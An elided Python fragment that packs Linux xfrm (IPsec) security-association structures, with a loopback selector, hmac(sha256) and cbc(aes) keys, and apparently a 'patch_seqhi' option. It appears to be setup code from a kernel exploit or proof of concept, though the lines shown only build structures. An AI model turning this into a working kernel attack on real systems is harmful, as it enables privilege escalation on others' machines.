...
def add_xfrm_sa(spi, patch_seqhi):
    ...
    struct.pack_into(">I", xs, 4, 0x7f000001)    # sel.saddr.a4
    struct.pack_into("<H", xs, 8, socket.AF_INET)  # sel.family
    struct.pack_into("<B", xs, 10, 32)             # sel.prefixlen_d
    struct.pack_into("<B", xs, 11, 32)             # sel.prefixlen_s
    ...
    auth_data = bytearray(104)  # 72 + 32 = 104
    auth_data[:64] = b"hmac(sha256)\x00" + b"\x00" * 52
    # Actually, strncpy-like: just set first bytes
    auth_data[:12] = b"hmac(sha256)"
    struct.pack_into("<I", auth_data, 64, 32 * 8)
    struct.pack_into("<I", auth_data, 68, 128)
    auth_data[72:104] = bytes([0xAA] * 32)
    assert len(auth_data) == 104
    ...
    # --- XFRMA_ALG_CRYPT ---
    crypt_data = bytearray(84)  # 68 + 16 = 84
    crypt_data[:64] = b"cbc(aes)\x00" + b"\x00" * 56
    crypt_data[:8] = b"cbc(aes)"
    struct.pack_into("<I", crypt_data, 64, 16 * 8)
    crypt_data[68:84] = bytes([0xBB] * 16)
    assert len(crypt_data) == 84
